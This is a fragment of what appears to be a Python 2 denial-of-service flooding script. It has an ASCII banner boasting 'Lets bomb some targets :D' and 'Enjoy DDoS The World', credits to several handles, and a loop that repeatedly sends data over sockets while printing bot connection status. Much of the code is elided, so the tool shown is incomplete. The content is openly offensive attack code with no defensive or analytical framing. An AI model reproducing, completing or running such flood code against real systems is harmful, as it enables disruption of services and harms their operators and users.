...
unknown
 ...
 ` - .
       ` - >->
-
					Lets bomb some targets :D
                                               
\033[0;m 
\033[1;36m##=================================================================##\033[0;m                        
\033[1;36m##\033[0;m     \033[1;42mCredits- S0u1, Vince, Protoxic ==> Enjoy DDoS The World\033[0;m   \033[1;36m  ##\033[0;m 
\033[1;36m##=================================================================##\033[0;m
  ...
  while True:
   try:
    ...
    for fg in range(random.randint(5,30)):
     ...
     try:
      s.send(m)
      print"[!]Bot: {} | Bytes: {} |\033[1;42mCONNECTED\033[0;m|".format(ipp,len(m))
